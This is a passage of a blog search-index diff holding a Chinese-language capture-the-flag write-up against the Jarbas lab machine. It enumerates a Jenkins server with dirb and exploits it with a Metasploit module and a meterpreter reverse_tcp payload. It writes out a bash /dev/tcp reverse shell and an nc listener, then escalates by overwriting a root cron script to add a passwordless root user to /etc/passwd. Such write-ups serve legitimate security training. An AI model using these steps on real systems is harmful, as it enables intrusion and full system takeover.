使用的是Jetty,在8080端口<code>http://172.17.135.54:8080</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:48] </span></span><br><span class="line">$ dirb http://172.17.135.54:8080 &gt; /home/divint3/ctf_chache/list.txt </span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:07:57] </span></span><br><span class="line">$ sed <span class="string">'/^==&gt;.*/!d'</span> /home/divint3/ctf_chache/list.txt</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/               </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/                  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/         </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/            </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/   </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/classes/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/fields/  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/name/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/package/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/class/      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/classes/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/fields/     </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/name/       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/package/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/class/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/classes/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/fields/</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:41] C:1</span></span><br><span class="line">$ sed -e <span class="string">'/^+.*/!d'</span> /home/divint3/ctf_chache/list.txt </span><br><span class="line">+ http://172.17.135.54:8080/error (CODE:400|SIZE:5329)</span><br><span class="line">+ http://172.17.135.54:8080/favicon.ico (CODE:200|SIZE:17542)</span><br><span class="line">+ http://172.17.135.54:8080/login (CODE:200|SIZE:5988)</span><br><span class="line">+ http://172.17.135.54:8080/<span class="built_in">logout</span> (CODE:302|SIZE:0</span><br><span class="line">+ http://172.17.135.54:8080/robots.txt (CODE:200|SIZE:71</span><br><span class="line">+ http://172.17.135.54:8080/assets/dynamic (CODE:500|SIZE:13989)</span><br></pre></td></tr></table></figure>
+<p>dirb发现robots.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># we don't want robots to click "build" links</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure></p>
+<p>先测试一下脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/jenkins_script_console) &gt; search jenkins</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----       -----  -----------</span><br><span class="line">   1   auxiliary/gather/jenkins_cred_recovery                                 normal     Yes    Jenkins Domain Credential Recovery</span><br><span class="line">   2   auxiliary/scanner/http/jenkins_command                                 normal     Yes    Jenkins-CI Unauthenticated Script-Console Scanner</span><br><span class="line">   3   auxiliary/scanner/http/jenkins_enum                                    normal     Yes    Jenkins-CI Enumeration</span><br><span class="line">   4   auxiliary/scanner/http/jenkins_login                                   normal     Yes    Jenkins-CI Login Utility</span><br><span class="line">   5   auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum                   normal     No     Jenkins Server Broadcast Enumeration</span><br><span class="line">   6   exploit/linux/misc/jenkins_java_deserialize           2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability</span><br><span class="line">   7   exploit/linux/misc/jenkins_ldap_deserialize           2016-11-16       excellent  Yes    Jenkins CLI HTTP Java Deserialization Vulnerability</span><br><span class="line">   8   exploit/linux/misc/opennms_java_serialize             2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution</span><br><span class="line">   9   exploit/multi/http/jenkins_metaprogramming            2019-01-08       excellent  Yes    Jenkins ACL Bypass and Metaprogramming RCE</span><br><span class="line">   10  exploit/multi/http/jenkins_script_console             2013-01-18       good       Yes    Jenkins-CI Script-Console Java Execution</span><br><span class="line">   11  exploit/multi/http/jenkins_xstream_deserialize        2016-02-24       excellent  Yes    Jenkins XStream Groovy classpath Deserialization Vulnerability</span><br><span class="line">   12  exploit/windows/misc/ibm_websphere_java_deserialize   2015-11-06       excellent  No     IBM WebSphere RCE Java Deserialization Vulnerability</span><br><span class="line">   13  post/multi/gather/jenkins_gather                                       normal     No     Jenkins Credential Collector</span><br></pre></td></tr></table></figure></p>
+<p>使用<code>exploit/multi/http/jenkins_metaprogramming</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 172.17.135.59 </span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 172.17.135.80</span><br><span class="line"><span class="built_in">set</span> lport 4442</span><br><span class="line"><span class="built_in">set</span> ForceExploit <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>反弹shell至本地</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.17.135.80/4442 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [18:58:07] C:1</span></span><br><span class="line">$ nc -lvp 4442</span><br><span class="line">listening on [any] 4442 ...</span><br><span class="line">connect to [172.17.135.80] from bogon [172.17.135.59] 55308</span><br></pre></td></tr></table></figure>
+<p>尝试suid文件提权, 没有特定文件</p>
+<p>发现crontab <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>修改目标脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sed -i '/^root.*/a divint3::0:0:root:/root:/bin/bash'"</span> &gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure></p>
+<p>等待一会 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">su divint3</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">[root@jarbas /]<span class="comment"># cd /root</span></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">Hey!</span><br><span class="line"></span><br><span class="line">Congratulations! You got it! I always knew you could <span class="keyword">do</span> it!</span><br><span class="line">This challenge was very easy, huh? =)</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> appreciating this machine.</span><br><span class="line"></span><br><span class="line">@tiagotvrs </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:997:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br><span class="line">jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
-        <category>linux工具</category>
+        <category>writeup</category>
       </categories>
   </entry>
 </search>
